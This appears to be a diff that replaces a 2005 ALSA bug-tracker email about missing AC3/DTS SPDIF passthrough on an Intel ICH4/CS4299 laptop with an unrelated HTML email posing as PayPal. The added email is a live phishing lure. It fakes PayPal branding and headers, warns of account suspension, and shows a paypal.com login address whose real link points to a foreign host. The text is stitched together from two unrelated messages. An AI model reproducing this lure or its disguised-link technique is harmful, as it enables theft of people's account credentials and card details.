@@ -1,14 +1,9 @@
-From: bugtrack@alsa-project.org
-Subject: [ALSA - driver 0000839]: No AC3/DTS via SPDIF on Intel 82801DB-ICH4 with CS4299
-Date: Sat, 30 Jul 2005 18:57:20 +0200
-Message-ID: <3f3c9c2fa982eeec432f5f57d25d7330@bugtrack.alsa-project.org>
-Mime-Version: 1.0
-Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: 7bit
+From: PayPal <paypal@email.paypal.com>
+Subject: Account Review Team
+Date: Sun, 31 Jul 2005 03:39:43 +0800
+Message-ID: <E1DyxBP-0000ZB-Kx@incredibles.technologer.net>
+Content-Type: text/html
 Return-path: <alsa-devel-admin@lists.sourceforge.net>
-Received: from bugtrack.alsa-project.org (gate.perex.cz [82.113.61.162])
-	by alsa.jcu.cz (ALSA's E-mail Delivery System) with ESMTP id 9D9991B0
-	for <alsa-devel@alsa-project.org>; Sat, 30 Jul 2005 18:57:20 +0200 (MEST)
 Sender: alsa-devel-admin@lists.sourceforge.net
 Errors-To: alsa-devel-admin@lists.sourceforge.net
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
@@ -18,207 +13,132 @@ List-Help: <mailto:alsa-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
 	<mailto:alsa-devel-request@lists.sourceforge.net?subject=subscribe>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=alsa-devel>
-To: alsa-devel@alsa-project.org
+To: alsa-devel@lists.sourceforge.net
 List-Id: alsa-devel@alsa-project.org
 
 
-A NOTE has been added to this issue.
-======================================================================
-<https://bugtrack.alsa-project.org/alsa-bug/view.php?id=839> 
-======================================================================
-Reported By:                Mimosius
-Assigned To:                
-======================================================================
-Project:                    ALSA - driver
-Issue ID:                   839
-Category:                   PCI - intel8x0
-Reproducibility:            always
-Severity:                   minor
-Priority:                   normal
-Status:                     new
-Distribution:               SuSE 9.2
-Kernel Version:             2.6.8-24.10 + 2.6.10
-======================================================================
-Date Submitted:             01-21-2005 03:12 CET
-Last Modified:              07-30-2005 18:57 CEST
-======================================================================
-Summary:                    No AC3/DTS via SPDIF on Intel 82801DB-ICH4 with
-CS4299
-Description: 
-Audio-mode via SPDIF works fine but I can't get any non-audio passthru
-working.
-
-Using 'ac3play -C test.ac3' SPDIF output is set to AES0=0x2 AES1=0x82
-AES2=0x0 AES3=0x2 and the PCM indicator on external decoder turns off, but
-there seems to arrive no decodeable signal on receiver side.
-There are no errors or warnings after loading soundrivers and there are no
-other soundcards plugged in (notebook).
-
-
-here are some system informations:
-
-# cat /etc/modprobe.d/sound
-alias snd-card-0 snd-intel8x0
-options snd-ac97-codec
-options snd-intel8x0 enable=1 index=0
-
-
-# cat /proc/asound/pcm' 
-00-00: Intel ICH : Intel 82801DB-ICH4 : playback 1 : capture 1
-00-01: Intel ICH - MIC ADC : Intel 82801DB-ICH4 - MIC ADC : capture 1
-00-02: Intel ICH - MIC2 ADC : Intel 82801DB-ICH4 - MIC2 ADC : capture 1
-00-03: Intel ICH - ADC2 : Intel 82801DB-ICH4 - ADC2 : capture 1
-00-04: Intel ICH - IEC958 : Intel 82801DB-ICH4 - IEC958 : playback 1
-
-
-# cat /proc/asound/card0/codec97#0/ac97#0-0' (while playing ac3 using
-ac3dec -C)
-0-0/0: Cirrus Logic CS4299 rev 4
-
-Capabilities     : -headphone out-
-DAC resolution   : 20-bit
-ADC resolution   : 18-bit
-3D enhancement   : Crystal Semi 3D Stereo Enhancement
-
-Current setup
-Mic gain         : +0dB [+0dB]
-POP path         : pre 3D
-Sim. stereo      : off
-3D enhancement   : off
-Loudness         : off
-Mono output      : Mic
-Mic select       : Mic1
-ADC/DAC loopback : off
-Extended ID      : codec=0 rev=0 AMAP DSA=0 VRA
-Extended status  : VRA
-PCM front DAC    : 48000Hz
-PCM ADC          : 48000Hz
-SPDIF Control    : Consumer Non-audio Category=0x2 Generation=1 Rate=48kHz
-Enabled
-
-
-# cat /proc/asound/card0/codec97#0/ac97#0-0+regs (while playing ac3 using
-ac3dec -C)
-0:00 = 1990
-0:02 = 3f3f
-0:04 = 9f1f
-0:06 = 801f
-0:08 = 0000
-0:0a = 801e
-0:0c = 801f
-0:0e = 8000
-0:10 = 9f1f
-0:12 = 9f1f
-0:14 = 9f1f
-0:16 = 9f1f
-0:18 = 8000
-0:1a = 0606
-0:1c = 0f0f
-0:1e = 0000
-0:20 = 0200
-0:22 = 0000
-0:24 = 0000
-0:26 = 800f
-0:28 = 0201
-0:2a = 0001
-0:2c = bb80
-0:2e = 0000
-0:30 = 0000
-0:32 = bb80
-0:34 = 0000
-0:36 = 0000
-0:38 = 0000
-0:3a = 0000
-0:3c = 0000
-0:3e = 0000
-0:40 = 0000
-0:42 = 0000
-0:44 = 0000
-0:46 = 0000
-0:48 = 0000
-0:4a = 0000
-0:4c = 0000
-0:4e = 0000
-0:50 = 0000
-0:52 = 0000
-0:54 = 0000
-0:56 = 0000
-0:58 = 0000
-0:5a = 0404
-0:5c = 0000
-0:5e = 0080
-0:60 = 0022
-0:62 = 0000
-0:64 = 0000
-0:66 = 0000
-0:68 = 8826
-0:6a = 0000
-0:6c = 0000
-0:6e = 0000
-0:70 = 0000
-0:72 = 0000
-0:74 = 0000
-0:76 = 0000
-0:78 = 003f
-0:7a = 0000
-0:7c = 4352
-0:7e = 5934
-
-======================================================================
-
-----------------------------------------------------------------------
- tiwai - 07-29-05 17:54 
-----------------------------------------------------------------------
-Yes, DDM bit might affect the output data.  It's worthy to try.
-
-You can change the register bit on the fly by writing proc file on ALSA
-(when compiled with debug option).
-As root, write the register value like:
-  # echo 5e 0100 > /proc/asound/card0/codec97#0/ac97#0-0+regs
-
-----------------------------------------------------------------------
- mrbox - 07-30-05 18:57 
-----------------------------------------------------------------------
-[quote]
-Yes, DDM bit might affect the output data. It's worthy to try.
-
-You can change the register bit on the fly by writing proc file on ALSA
-(when compiled with debug option).
-As root, write the register value like:
-  # echo 5e 0100 > /proc/asound/card0/codec97#0/ac97#0-0+regs
-[/quote]
-
-I have tried it, I compiled the alsa-drivers with --enable-debug=full but
-i can't set the register value.
-
-The command results in a "No such device".
-
-The alsa wiki tells us that the file is set RO, I have changed it to RWX
-but the result is the same.
-
-Issue History
-Date Modified  Username       Field                    Change              
-======================================================================
-01-21-05 03:12 Mimosius       New Issue                                    
-01-21-05 03:12 Mimosius       Distribution              => SuSE 9.2        
-01-21-05 03:12 Mimosius       Kernel Version            => 2.6.8-24.10 + 2.6.10
-01-21-05 03:13 Mimosius       Issue Monitored: Mimosius                    
-03-01-05 11:31 Mimosius       Note Added: 0003758                          
-03-15-05 21:37 Mimosius       Note Added: 0003917                          
-03-16-05 12:47 tiwai          Note Added: 0003945                          
-03-16-05 12:47 tiwai          Note Added: 0003946                          
-03-17-05 01:00 Mimosius       Note Added: 0003975                          
-06-22-05 13:08 Mimosius       Note Added: 0005132                          
-06-22-05 17:56 tiwai          Note Added: 0005137                          
-06-22-05 18:58 Mimosius       Note Added: 0005143                          
-07-14-05 15:50 mrbox          Note Added: 0005475                          
-07-14-05 21:13 Mimosius       Note Added: 0005479                          
-07-26-05 20:02 rziai          Issue Monitored: rziai                       
-07-26-05 20:08 rziai          Note Added: 0005571                          
-07-29-05 17:54 tiwai          Note Added: 0005581                          
-07-30-05 18:57 mrbox          Note Added: 0005592                          
-======================================================================
-
+<html>
+<head>
+<style type="text/css">
+#message .notified {}
+#message, #message TD {font-family: verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+#message LI {line-height: 120%;}
+#message UL.ppsmallborder {margin:10px 5px 10px 20px;}
+#message LI.ppsmallborderli {margin:0px 0px 5px 0px;}
+#message UL.pp_narrow {margin:10px 5px 0px 40px;}
+#message hr.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left:
+#fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+#message .pp_label {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;font-weight: bold;color: #000000;}
+#message .pp_serifbig {font-family: serif;font-size: 20px;font-weight: bold;color:
+#000000;}
+#message .pp_serif{font-family: serif;font-size: 16px;color: #000000;}
+#message .pp_sansserif{font-family: verdana,arial,helvetica,sans-serif; font-size:
+16px;color: #000000;}
+#message .pp_heading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+18px;font-weight: bold;color: #003366;}	
+#message .pp_subheadingeoa {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color:
+#000000;}	
+#message .pp_subheading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+16px;font-weight: bold;color: #003366;}	
+#message .pp_sidebartext {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #003366;}	
+#message .pp_sidebartextbold {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color:
+#003366;}	
+#message .pp_footer {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #aaaaaa;}
+#message .pp_button {font-size: 13px; font-family:
+verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset;
+color:#000000; background-color: #cccccc;}
+#message .pp_smaller {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;color: #000000;}
+#message .pp_smallersidebar {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+#message .ppem106 {font-weight: 700;}
+</style>
+</head>
+<xbody bgcolor="#ffffff">
+<table width="600" cellspacing="0" cellpadding="0" border="0"
+align="center">
+	<tr valign="top">
+		<td>
+        <p align="center"><font face="Verdana" style="font-size: 9pt"><A 
+target="_blank" 
+href="http://mail.aranda.co.za/~info/cgi_bin/webscr=cmd=_home/index.php" 
+><IMG
+src="http://images.paypal.com/en_US/i/logo/email_logo.gif"  alt="PayPal"
+border="0" width="255" height="35"></A> </font>
+		</td>
+	</tr>
+</table>
+<div align="center">
+  <center>
+<table width="750" cellspacing="0" cellpadding="0" border="0" height="316" style="border-collapse: collapse" bordercolor="#111111">
+<tr>
+	<td background="http://images.paypal.com/images/bg_clk.gif" 
+width=750 height="29"><font face="Verdana" style="font-size: 9pt"><img src="http://images.paypal.com/images/pixel.gif"  height="29"
+width="1" border="0"></font></td>
+</tr>	
+<tr>
+	<td height="287" width="750"><font face="Verdana" style="font-size: 9pt"><b><img src="http://images.paypal.com/images/pixel.gif"  height="10"
+width="1" border="0"></b>PayPal is committed to maintaining a safe environment for 
+    its community of customers. To protect the security of your account, PayPal 
+    employs some of the most advanced security systems in the world and our 
+    anti-fraud teams regularly screen the PayPal system for unusual activity.
+    <br>
+    <br>
+    We are contacting you because on 30 July 2005 our Account 
+Review 
+    Team identified some unusual activity in your account. In accordance with 
+    PayPal's User Agreement and to ensure that your account has not been 
+    compromised, access to your account was limited. Your account access will 
+    remain limited until this issue has been resolved.<br>
+    <br>
+    To secure your account and quickly restore full access, we may require some 
+    additional information from you for the following reason:<br>
+    <br>
+    We have been notified that a card associated with your account has been 
+    reported as lost or stolen, or that there were additional problems with your 
+    card.<br>
+    <br>
+    <br>
+    This process is mandatory, and if not completed within the nearest time your 
+    account or credit card may be subject for temporary suspension. <br>
+    <br>
+    To securely confirm your PayPal information please click on the link bellow:<br>
+    <br>
+    <br>
+    <br>
+    <a 
+href="http://mail.aranda.co.za/~info/cgi_bin/webscr=cmd=_home/index.php" 
+target="_blank"><b>https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</b></a><b><br>
+    <br>
+    <br>
+    <br>
+    </b>We encourage you to log in and perform the steps necessary to restore your 
+    account access as soon as possible. Allowing your account access to remain 
+    limited for an extended period of time may result in further limitations on 
+    the use of your account and possible account closure.<br>
+    <br>
+    For more information about how to protect your account please visit PayPal 
+    Security Center. We apologize for any incovenience this may cause, and we 
+    apriciate your assistance in helping us to maintain the integrity of the 
+    entire PayPal system.<br>
+    <br>
+    <br>
+    <br>
+    Thank you for using PayPal!<br>
+    The PayPal Team<br>
+&nbsp;</font></td>
+</tr>
+</table>
+  </center>
+</div>
+</xbody>   
+</html>
 
 
 
